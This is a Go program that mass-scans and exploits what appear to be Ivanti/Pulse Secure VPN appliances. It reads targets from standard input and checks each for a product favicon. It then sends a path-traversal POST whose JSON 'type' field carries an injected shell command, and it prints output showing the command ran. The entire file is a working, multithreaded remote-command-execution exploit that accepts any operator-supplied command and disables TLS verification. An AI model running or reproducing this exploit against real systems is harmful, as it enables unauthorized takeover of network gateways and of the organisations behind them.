package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var cmd string
var threads int

func init() {
	flag.StringVar(&cmd, "cmd", "id", "The command to replace 'id' in the payload")
	flag.IntVar(&threads, "t", 5, "Number of concurrent threads")
	flag.Parse()
}

func makeRequestAndCheck(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 2 * time.Second}
	// Create a new GET request
	req, err := http.NewRequest("GET", url+"/dana-na/imgs/Product_favicon.png", nil)
	if err != nil {
		fmt.Printf("Error creating request for %s: %v\n", url, err)
		return
	}

	// Set the user agent
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0")

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close() // Ensure the response body is closed

	if resp.StatusCode != 200 {
		return // Stop processing if the status code is not 200
	}
	contentType := resp.Header.Get("Content-Type")
	if contentType != "image/png" {
		return // Stop processing if Content-Type is not image/png
	}

	targetPath := "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"

	payload := map[string]string{
		"type":          fmt.Sprintf(";%s;", cmd),
		"txtGCPProject": "12345678",
		"txtGCPSecret":  "12345678",
		"txtGCPPath":    "12345678",
		"txtGCPBucket":  "12345678",
	}
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return
	}

	req, err = http.NewRequest("POST", url+targetPath, strings.NewReader(string(jsonPayload)))
	if err != nil {
		fmt.Printf("Error creating request for %s: %v\n", url, err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err = client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response from %s: %v\n", url, err)
		return
	}

	if cmd != "id" {
		var jsonResponse map[string]interface{}
		err := json.Unmarshal(body, &jsonResponse)
		if err != nil {
			return
		}
		if errorVal, ok := jsonResponse["error"]; ok {
			fmt.Println(url, errorVal)
		} else {
			fmt.Println("No 'error' key in response")
		}
	} else {
		if strings.Contains(string(body), "uid") {
			fmt.Println(url, string(body))
		}
	}
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)
	urls := make(chan string, threads)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		go func() {
			for url := range urls {
				makeRequestAndCheck(url, &wg)
			}
		}()
	}

	for scanner.Scan() {
		wg.Add(1) // Correct placement: Increment the WaitGroup counter here
		urls <- scanner.Text()
	}

	close(urls)
	wg.Wait() // Wait for all goroutines to finish

	if err := scanner.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "Error reading input: %v\n", err)
	}
}
